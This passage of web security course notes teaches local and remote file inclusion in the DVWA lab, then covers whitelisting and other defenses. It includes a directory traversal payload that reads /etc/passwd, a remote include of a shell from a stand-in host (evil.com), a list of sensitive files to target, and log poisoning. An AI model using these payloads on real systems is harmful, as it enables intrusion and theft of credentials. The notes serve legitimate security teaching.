Allowed Pages
```

it directly loads whatever filename the user provides.

---

# Types of File Inclusion

There are two primary categories.

---

# 1. Local File Inclusion (LFI)

Local File Inclusion allows the attacker to include files that already exist on the server.

Examples:

- Configuration files
- Password files
- Source code
- Log files

---

## Example

URL:

```text
http://target/dvwa/?page=../../../../etc/passwd
```

The application executes:

```php
include("../../../../etc/passwd");
```

Instead of displaying a web page,

the contents of the Linux password file are displayed.

---

# 2. Remote File Inclusion (RFI)

Remote File Inclusion occurs when the application allows files to be loaded from another server.

Example:

```text
?page=http://evil.com/shell.php
```

The application downloads:

```text
shell.php
```

and executes it.

---

# Why RFI is More Dangerous

If remote inclusion is enabled,

the attacker may execute arbitrary code.

Possible consequences:

- Remote Code Execution
- Web Shell Installation
- Full Server Compromise

Fortunately,

modern PHP installations disable Remote File Inclusion by default.

---

# Understanding Relative Paths

Applications often load pages using relative paths.

Example:

```text
?page=home.php
```

Current directory:

```text
/var/www/html/dvwa/
```

Actual file:

```text
/var/www/html/dvwa/home.php
```

The browser never sees the real filesystem.

Only the web server does.

---

# What is Directory Traversal?

Suppose the application is inside:

```text
/var/www/html/dvwa/
```

The attacker supplies:

```text
../../../../etc/passwd
```

Let's understand this.

Each:

```text
..
```

means:

```text
Go up one directory.
```

Example:

```text
Current

↓

/var/www/html/dvwa

↓

..

↓

/var/www/html

↓

..

↓

/var/www

↓

..

↓

/

↓

etc/passwd
```

Eventually,

the attacker reaches the root directory and accesses:

```text
/etc/passwd
```

---

# Practical Demonstration – DVWA File Inclusion

Navigate to:

```text
DVWA

↓

File Inclusion

↓

Security = Low
```

The page loads content using:

```text
?page=file1.php
```

The attacker replaces:

```text
file1.php
```

with:

```text
../../../../etc/passwd
```

---

# Expected Result

Instead of a normal page,

DVWA displays something similar to:

```text
root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon

www-data:x:33:33:www-data
```

---

# What is /etc/passwd?

The file:

```text
/etc/passwd
```

exists on Linux systems.

Historically,

it stored user passwords.

Modern Linux systems store password hashes separately in:

```text
/etc/shadow
```

Today,

`/etc/passwd` primarily contains:

- Usernames
- User IDs
- Group IDs
- Home directories
- Default shells

Although it no longer stores passwords,

it still reveals valuable information about the system.

---

# Why Attackers Read /etc/passwd

The file helps identify:

- Existing users
- Service accounts
- Installed applications
- Potential privilege escalation paths

It also confirms:

```text
The server is Linux.
```

---

# Other Interesting Files

Attackers may attempt to read:

Apache configuration:

```text
/etc/apache2/apache2.conf
```

PHP configuration:

```text
php.ini
```

Application configuration:

```text
config.php
```

Database credentials:

```text
database.php
```

SSH configuration:

```text
/etc/ssh/sshd_config
```

Log files:

```text
/var/log/apache2/access.log
```

---

# File Inclusion Leading to Code Execution

LFI initially appears to be an information disclosure vulnerability.

However,

under certain conditions,

it may become Remote Code Execution.

Example:

Attacker injects PHP code into:

```text
Apache Access Log
```

Later,

the application includes:

```text
access.log
```

PHP executes the injected code.

This technique is known as:

```text
Log Poisoning
```

---

# Why Validation is Important

Suppose the application only allows:

```text
home.php

about.php

contact.php
```

Instead of trusting:

```text
?page=ANYTHING
```

the application checks:

```text
Is this filename inside the approved list?
```

If not,

reject the request.

---

# Secure Design

Instead of:

```php
include($_GET['page']);
```

Use:

```php
switch($page){

case "home":

include("home.php");

break;

case "about":

include("about.php");

break;

default:

include("404.php");

}
```

Now the user never controls filesystem paths.

---

# Other Defenses

The PPT lists several defensive measures.

Let's understand them.

---

## Whitelisting

Only predefined files may be loaded.

Good:

```text
home

about

contact
```

Bad:

```text
../../etc/passwd
```

Rejected.

---

## Disable Remote Includes

PHP setting:

```text
allow_url_include=Off
```

Prevents:

```text
http://evil.com/shell.php
```

from being included.

---

## Canonical Path Validation

The application resolves the actual filesystem path.

If the resolved path lies outside the intended directory,

the request is rejected.

This prevents directory traversal.

---

## Least Privilege

The web server should run with minimal permissions.

If Apache cannot read:

```text
/etc/shadow
```

then LFI cannot expose it.

---

## Secure File Permissions

Sensitive files should not be readable by the web server.

Examples:

- SSH Keys
- Database Backups
- Configuration Secrets

---

# Compare Low vs Impossible

Low Security:

```php
include($_GET['page']);
```

Impossible Security:

- Input validation
- Whitelisting
- Canonical path checks
- Safe file mapping

Comparing these implementations demonstrates how secure file loading should be designed.

---

# Difference Between LFI and RFI

| Local File Inclusion | Remote File Inclusion |
|----------------------|----------------------|
| Reads local files | Includes files from remote servers |
| Information disclosure | Often Remote Code Execution |
| Requires existing files | Downloads attacker-controlled files |
| More common today | Rare due to secure PHP defaults |

---

# Relationship with Previous Attacks

Notice how every vulnerability studied in this session shares the same fundamental problem.

| Vulnerability | Trusted Input |
|--------------|---------------|
| SQL Injection | SQL Query |
| XSS | HTML/JavaScript |
| CSRF | Authenticated Requests |
| File Inclusion | File Paths |

The common root cause is always:

```text
Never trust user-controlled input.
```

---

# Key Takeaways

- File Inclusion occurs when applications allow users to control filenames.
- Local File Inclusion (LFI) accesses files already present on the server.
- Remote File Inclusion (RFI) loads attacker-controlled files from external servers.
- Directory traversal (`../`) allows movement outside the intended directory.
- `/etc/passwd` is commonly used to demonstrate successful LFI on Linux systems.
- File Inclusion may expose sensitive configuration files and credentials.
- Under certain conditions, LFI can lead to Remote Code Execution through techniques such as log poisoning.
- The safest defense is to avoid directly using user input in file inclusion operations.
- Whitelisting, canonical path validation, secure permissions, and disabling remote includes significantly reduce risk.
- Comparing **Low** and **Impossible** implementations in DVWA clearly demonstrates secure file handling practices.

---

# Session 9 – Final Summary

This practical session brought together four of the most important web application vulnerabilities:

1. **SQL Injection (SQLi)** – Inject SQL commands into database queries.
2. **Cross-Site Scripting (XSS)** – Inject JavaScript into web pages executed by the victim's browser.
3. **Cross-Site Request Forgery (CSRF)** – Trick an authenticated user's browser into sending unauthorized requests.
4. **File Inclusion (LFI/RFI)** – Manipulate file paths to access unintended local or remote files.

Although each attack targets a different component of a web application, they all originate from the same security mistake:

```text
The application trusted user-controlled input.
```

The instructor emphasized a consistent learning approach throughout the session:

```text
Understand the vulnerability
        ↓
Exploit it safely in DVWA
        ↓
Observe the impact
        ↓
Study the vulnerable source code
        ↓
Compare with the "Impossible" implementation
        ↓
Learn the correct defensive coding practice
```

This workflow helps students understand not only **how attacks work**, but also **why secure coding practices prevent them**.

The final takeaway from the session is the fundamental principle of secure web development:

```text
Never trust client input.

Always validate, sanitize, encode,
and enforce security on the server.
```

